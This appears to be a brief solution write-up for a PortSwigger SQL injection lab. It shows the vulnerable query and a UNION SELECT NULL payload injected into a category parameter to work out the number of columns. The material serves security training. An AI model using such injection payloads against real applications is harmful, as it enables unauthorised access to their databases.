## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/87c37d0d-a9be-450a-91be-316964a825fc)

## Solution :
Query made - 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

#### Finding out the number of columns -

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ' UNION SELECT NULL,NULL--
```

**2 NULL** returns no error , which means there are 2 columns in the database.
